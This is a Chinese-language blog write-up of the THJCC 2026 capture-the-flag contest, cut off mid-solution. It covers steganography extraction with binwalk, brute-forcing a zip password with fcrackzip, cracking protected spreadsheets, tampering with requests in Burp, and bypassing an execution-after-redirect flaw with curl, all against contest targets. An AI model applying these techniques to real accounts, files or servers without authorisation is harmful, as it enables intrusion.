<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>THJCC 2026 writeup | huiink&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="六十四座黃銅塔傾覆之夜 八十八個黎明醒轉之時 以八分之一刃 刺穿十三翼天使 斬落第八道光">
<meta property="og:type" content="article">
<meta property="og:title" content="THJCC 2026 writeup">
<meta property="og:url" content="https://huiink.github.io/2026/02/22/THJCC2026Writeip/index.html">
<meta property="og:site_name" content="huiink&#39;s blog">
<meta property="og:description" content="六十四座黃銅塔傾覆之夜 八十八個黎明醒轉之時 以八分之一刃 刺穿十三翼天使 斬落第八道光">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://huiink.github.io/img/logo2.png">
<meta property="article:published_time" content="2026-02-21T16:00:00.000Z">
<meta property="article:modified_time" content="2026-03-01T14:20:45.530Z">
<meta property="article:author" content="老祖">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="note">
<meta property="article:tag" content="web">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://huiink.github.io/img/logo2.png">
  
    <link rel="alternate" href="/atom.xml" title="huiink's blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/cover.webp" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>huiink's blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">主頁</a>
    
      <a class="main-nav-link" href="/archives">彙整</a>
    
      <a class="main-nav-link" href="/about">關於</a>
    
      <a class="main-nav-link" href="/friends">友鏈</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">主頁</a>
    
      <a class="nav-dropdown-link" href="/archives">彙整</a>
    
      <a class="nav-dropdown-link" href="/about">關於</a>
    
      <a class="nav-dropdown-link" href="/friends">友鏈</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/avatar.webp></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">老祖 </div>
      <div class="dot"></div>
      <div class="subtitle">保障每天三小時的睡眠 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.instagram.com/huiink/" title="IG"><i class="fa-brands fa-instagram"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://steamcommunity.com/id/h0730/" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/huiink" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" href="mailto:huanghongjunh2@gmail.com" title="Email"><i class="fa-solid fa-envelope"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://discord.com/users/1124244726913179679" title="DC"><i class="fa-brands fa-discord"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分類</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/%E7%AB%B6%E8%B3%BD/">
                競賽
                <div class="category-count">2</div>
            </a>
        <div class="children"><div class="category-box">
            <a class="category-link" href="/categories/%E7%AB%B6%E8%B3%BD/CTF/">
                CTF
                <div class="category-count">2</div>
            </a>
        </div></div>
            <a class="category-link" href="/categories/Project/">
                Project
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/Program/">
                Program
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">標籤</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AI/" rel="tag">AI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/project/" rel="tag">project</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">彙整</h3>
      
      
        <a class="archive-link" href="/archives/2026/02 ">
          二月 2026 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2026/01 ">
          一月 2026 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2025/06 ">
          六月 2025 
          <div class="archive-count">1 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <a class="recent-link" href="/2026/02/28/%E6%A8%A1%E5%9E%8B%E9%81%93%E5%BE%B7%E5%88%87%E9%99%A4%E4%B9%8B%E5%AF%A6%E4%BD%9C/" title="模型道德切除與智力修復之實作" >
            <div class="recent-link-text">
              模型道德切除與智力修復之實作
            </div>
          </a>
        
          <a class="recent-link" href="/2026/02/22/THJCC2026Writeip/" title="THJCC 2026 writeup" >
            <div class="recent-link-text">
              THJCC 2026 writeup
            </div>
          </a>
        
          <a class="recent-link" href="/2026/01/09/11401FhCTFWriteup/" title="11401FhCTF Writeup" >
            <div class="recent-link-text">
              11401FhCTF Writeup
            </div>
          </a>
        
          <a class="recent-link" href="/2025/06/21/%E6%8A%80%E8%97%9D%E7%AB%B6%E8%B3%BD%E9%81%B8%E6%89%8B%E5%9F%B9%E8%A8%93%E6%9C%9F%E9%96%93%E5%88%B7%E9%A1%8C%E5%90%88%E9%9B%86/" title="技藝競賽選手培訓期間刷題合集" >
            <div class="recent-link-text">
              技藝競賽選手培訓期間刷題合集
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-THJCC2026Writeip" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cuidFDGgb9jMHugpaqqiOkBdC">
        <img src="/img/logo2.png" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        THJCC 2026 writeup
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2026-02-21T16:00:00.000Z" itemprop="datePublished">2026-02-22</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/%E7%AB%B6%E8%B3%BD/">競賽</a>><a class="meta-cate-link" href="/categories/%E7%AB%B6%E8%B3%BD/CTF/">CTF</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            15k 詞 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這自跨年的Fh11401後我打的第二個 CTF，有了上次的經驗這次比賽就比較知道該用麼思路了來解題了，<del>雖然還是很爛@@</del></p>
<p><img src="https://hackmd.io/_uploads/SkRvFyK_bl.png" alt="image"><br>也是獲得學生賽區第8名</p>
<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><p><img src="https://hackmd.io/_uploads/BJxhU5bYZe.png" alt="image"><br>裡面的字會亂飛<br> <img src="https://hackmd.io/_uploads/HJufU5Wtbg.png" alt="image"><br><del>當然是時機抓的對截圖就有了</del><br><img src="https://hackmd.io/_uploads/HkvyvcWK-l.png" alt="image"><br>（反正我是開主控台來看啦XD</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>我真的是很不會逆向，只有一題因為flag寫得很明顯有解出來，理所當然<br><del>我也不會Pwn</del><br>XD</p>
<h2 id="Super-baby-reverse"><a href="#Super-baby-reverse" class="headerlink" title="Super baby reverse"></a>Super baby reverse</h2><p>給了一個名為<code>THJCC_Super_Baby_Reverse</code>的檔案<br>開IDA<br>在hex中看到flag<br><img src="https://hackmd.io/_uploads/Skl4jJYu-l.png" alt="image"><br>去掉<code>H</code>的干擾</p>
<blockquote>
<p>flag：THJCC{BaBY_r3v3rs3_f0r_beggin3r}</p>
</blockquote>
<hr>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>不得不說<code>binwalk</code>真的很好用<br>很多題目都用這個解</p>
<h2 id="IMAGE"><a href="#IMAGE" class="headerlink" title="IMAGE?"></a>IMAGE?</h2><p>給了一個魔法阿嬤的圖<br><img src="https://hackmd.io/_uploads/SJxIxR1F_Wl.png" alt="image"><br>問了AI了解了<code>binwalk</code>這個好用的工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -e THJCC_IMAGE.png </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">3297649       0x325171        Zip archive data, at least v1.0 to extract, name: cute/</span><br><span class="line">3297712       0x3251B0        Zip archive data, at least v2.0 to extract, compressed size: 3295808, uncompressed size: 3297649, name: cute/F.png</span><br><span class="line">6593588       0x649C34        Zip archive data, at least v2.0 to extract, compressed size: 2009795, uncompressed size: 2009485, name: cute/F3.png</span><br></pre></td></tr></table></figure>
<p>裡面有一個<code>/cute</code>資料夾其中一張png就是flag<br><img src="https://hackmd.io/_uploads/HkiHyeYdWx.png" alt="image"></p>
<blockquote>
<p>flag：THJCC{fRierEN-OS_cUTe:)}</p>
</blockquote>
<h2 id="Provisioning-in-Progress"><a href="#Provisioning-in-Progress" class="headerlink" title="Provisioning in Progress"></a>Provisioning in Progress</h2><p>題目講了是要檢索名為AS201943的授權令牌<br><del>fishbaby1011你會不會太酷了這邊給到頂級</del><br>在NOC Portal (<a target="_blank" rel="noopener" href="http://fishbaby1011.net/">http://fishbaby1011.net/</a>) 資訊中看到了資源配置表<br>題目講道NOC授權令牌被綁定在真正在路由表上活躍的網段之中<br>其為<code>2a14:7581:6fa0::/48</code><br>使用WHOIS查詢</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whois -h whois.ripe.net -B 2a14:7581:6fa0::/48</span><br></pre></td></tr></table></figure>
<p>看到remarks為<code>v1.fWxhZXJfZXJhX3NleGlmZXJwX2RlY251b25uYV95bG5ve2Njamh0</code><br>去掉<code>v1.</code>後解base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;laer_era_sexiferp_decnuonna_ylno&#123;ccjht</span><br></pre></td></tr></table></figure>
<p>反轉後得可得</p>
<blockquote>
<p>flag：thjcc{only_announced_prefixes_are_real}<br><del>所以fishbaby1011為甚麼你的flag是小寫</del></p>
</blockquote>
<h2 id="Metro"><a href="#Metro" class="headerlink" title="Metro"></a>Metro</h2><p>給了一張捷運站內拍的圖需要找站名跟樓層<br><img src="https://hackmd.io/_uploads/Sk6oXxtu-g.png" alt="image"><br>注意到途中有一小湖以及給我的感覺像是青埔南崁那邊<br><del>對我就是通靈王</del><br>沿著機捷看衛星地圖，看到鼻山站很符合要求<br><img src="https://hackmd.io/_uploads/S1noEeFuWe.png" alt="image"></p>
<blockquote>
<p>flag：THJCC{A10-3F}</p>
</blockquote>
<h2 id="哦更愛你了"><a href="#哦更愛你了" class="headerlink" title="哦更愛你了"></a>哦更愛你了</h2><p>給了<code>.HEIC</code>的圖檔<br>圖像是燒肉<br><img src="https://hackmd.io/_uploads/ryNlLetdbl.png" alt="image"><br><del>我好餓我也要吃</del><br>在經過一貫的測試後發現使用<code>binwalk</code>可以看到裡面有隱藏的檔案</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -e challenge.HEIC             </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;jar xvf &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;jar&#x27;, &#x27;jar xvf &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class="line">2572595       0x274133        Zip archive data, encrypted at least v1.0 to extract, compressed size: 27, uncompressed size: 15, name: flag.txt</span><br></pre></td></tr></table></figure>
<p>名為<code>2572595.zip</code>的檔案其中有<code>flag.txt</code><br><img src="https://hackmd.io/_uploads/B1_nOeFdWe.png" alt="image"><br>需要輸入密碼<br>根據提示<code>在這特別的日子裡，送給你們一首非常特別的歌曲，特別的八字給特別的你（忽略標點符號）</code>以及題目的圖片推斷密碼為<code>19190810</code>或<code>11451419</code><br><img src="https://hackmd.io/_uploads/Hk9Hcxt_-e.png" alt="image"><br><del>竟然不對這不合理!!!!</del><br>根據<code>特別的八字</code>推斷密碼是8個位元<br>使用<code>fcrackzip</code>爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -b -c 1 -l 8-8 -u _challenge.HEIC.extracted</span><br></pre></td></tr></table></figure>
<p>得到密碼<code>30000810</code></p>
<blockquote>
<p>flag：THJCC{Y@JUNlKU}</p>
</blockquote>
<p><del>所以為甚麼不是11451419，我要申訴(⁠ノ⁠｀⁠Д⁠´⁠)⁠ノ⁠</del></p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="I-use-arch-btw"><a href="#I-use-arch-btw" class="headerlink" title="I use arch btw"></a>I use arch btw</h2><p><img src="https://hackmd.io/_uploads/rkzn3etuWe.png" alt="image"></p>
<p>按照題目敘述應該也是檔案被隱藏在其中<br>使用<code>binwalk</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -e THJCC_I_use_arch_btw.jpg </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">76507         0x12ADB         Zip archive data, at least v2.0 to extract, compressed size: 6284, uncompressed size: 9216, name: readme.xlsx</span><br></pre></td></tr></table></figure>
<p>給了兩個<code>redme.xlsx</code>其中一在<code>12ADB.zip</code>且皆有密碼保護<br>使用線上的工具破解檔案<br>破解後得到<br><img src="https://hackmd.io/_uploads/rJNg1-KOWl.png" alt="image"></p>
<blockquote>
<p>flag：THJCC{7h15_15_7h3_m3554g3….._1_u53_4rch_b7w}</p>
</blockquote>
<h2 id="TV"><a href="#TV" class="headerlink" title="TV"></a>TV</h2><p>提供了一個<code>.flac</code>音檔<br>按照題目名稱推斷有可能是<strong>SSTV</strong>，是過去業餘無線電愛好者的一種圖片傳輸方法<br>使用QSSTV監聽音訊<br><img src="https://hackmd.io/_uploads/ry6FxbKuZg.png" alt="螢幕擷取畫面 2026-02-22 200632"></p>
<p>不太會用只會開自動檔<br>所以很容易中斷擷取到部分不完整<br>但已足夠推斷</p>
<blockquote>
<p>flag：THJCC{sSTv-is_aMaZINg}</p>
</blockquote>
<h2 id="ExBaby-Shark-Master"><a href="#ExBaby-Shark-Master" class="headerlink" title="ExBaby Shark Master"></a>ExBaby Shark Master</h2><p>題目給了一pcapng封包檔<br><img src="https://hackmd.io/_uploads/Bk2-Q-YuZe.png" alt="image"><br>嘗試篩選THJCC沒想到真的成功了<br><img src="https://hackmd.io/_uploads/rkCH7ZtdWx.png" alt="image"></p>
<p>其明文就是flag</p>
<blockquote>
<p>THJCC{1t’S-3Asy*-r1gh7?????}</p>
</blockquote>
<p><del>我根本通靈王有人要跟我組金盾嗎</del></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>這邊給到夯<br>解最多的題目就是web，真的很適合給新手打（我就是</p>
<h2 id="Las-Vegas"><a href="#Las-Vegas" class="headerlink" title="Las Vegas"></a>Las Vegas</h2><p>一個拉霸機 按pull後會請求<code>/n=三位數</code>的封包<br><img src="https://hackmd.io/_uploads/rkQa7btubl.png" alt="image"></p>
<p>題目內文說了<strong>Lucky 7 7 7</strong><br>使用Burp Suitre修改請求的封包<br><img src="https://hackmd.io/_uploads/HJ-DBWKdZe.png" alt="image"></p>
<blockquote>
<p>flag：THJCC{LUcKy_sEVen_9111e6058407f339}</p>
</blockquote>
<h2 id="Ear"><a href="#Ear" class="headerlink" title="Ear"></a>Ear</h2><p>題目說明這是<strong>CWE-698</strong>漏洞，向客戶端發送了重定向指令，但並未终止原始頁面後續代碼的執行<br>嘗試 admin.php這個常見的後台管理頁面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i http://chal.thjcc.org:1234/admin.php</span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Date: Sun, 22 Feb 2026 22:45:23 GMT</span><br><span class="line">Server: Apache/2.4.66 (Debian)</span><br><span class="line">X-Powered-By: PHP/8.5.3</span><br><span class="line">Set-Cookie: PHPSESSID=e7becd48283171190c25e91dceb1f3ff; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Location: index.php</span><br><span class="line">Content-Length: 247</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Admin Panel&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Admin Panel&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;status.php&quot;&gt;Status page&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;image.php&quot;&gt;Image&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;system.php&quot;&gt;Setting&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                     </span><br></pre></td></tr></table></figure>
<p>請求<code>system.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Date: Sun, 22 Feb 2026 22:46:19 GMT</span><br><span class="line">Server: Apache/2.4.66 (Debian)</span><br><span class="line">X-Powered-By: PHP/8.5.3</span><br><span class="line">Set-Cookie: PHPSESSID=ea3569cd766263de18c0d6498665f634; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Location: index.php</span><br><span class="line">Content-Length: 184</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Admin Panel&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;System settings&lt;/p&gt;</span><br><span 